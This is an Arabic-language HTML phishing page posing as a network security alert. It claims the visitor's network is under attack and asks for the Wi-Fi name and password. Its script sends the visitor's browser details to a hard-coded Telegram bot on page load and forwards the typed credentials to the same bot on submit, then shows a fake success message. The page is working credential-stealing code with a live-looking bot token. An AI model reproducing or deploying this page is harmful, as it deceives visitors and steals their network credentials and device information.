<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام تأمين الشبكة</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; }
        h2 { color: #f85149; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #2ea043; }
        .footer { font-size: 11px; color: #8b949e; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card">
    <h2>⚠️ تنبيه أمني</h2>
    <p>تم رصد محاولة اختراق لشبكتك. يرجى تأكيد الهوية لتشفير الاتصال.</p>
    
    <input type="text" id="wifi_name" placeholder="اسم الشبكة (SSID)">
    <input type="password" id="wifi_pass" placeholder="كلمة مرور الشبكة">
    
    <button onclick="sendData()">تأمين الاتصال الآن</button>
    
    <div class="footer">المعرف الرقمي للاتصال: <span id="user_ip">جاري الفحص...</span></div>
</div>

<script>
    // إعدادات البوت الخاص بك
    const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
    const chat_id = "8042090388";

    // 1. سحب معلومات المتصفح والنظام تلقائياً عند فتح الصفحة
    window.onload = function() {
        const info = `🚀 زائر جديد للموقع:\n🌐 المتصفح: ${navigator.userAgent}\n🖥️ المنصة: ${navigator.platform}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
    };

    // 2. إرسال بيانات الواي فاي عند الضغط على الزر
    function sendData() {
        const name = document.getElementById('wifi_name').value;
        const pass = document.getElementById('wifi_pass').value;

        if(name === "" || pass === "") {
            alert("يرجى إدخال البيانات كاملة");
            return;
        }

        const message = `🔑 بيانات مسحوبة من الموقع:\n📶 الشبكة: ${name}\n🔐 الباسورد: ${pass}`;
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
        .then(() => {
            alert("تم إرسال الطلب، جاري تأمين جهازك...");
            document.body.innerHTML = "<h1 style='color:white; text-align:center;'>تم التأمين بنجاح ✅</h1>";
        });
    }
</script>

</body>
</html>
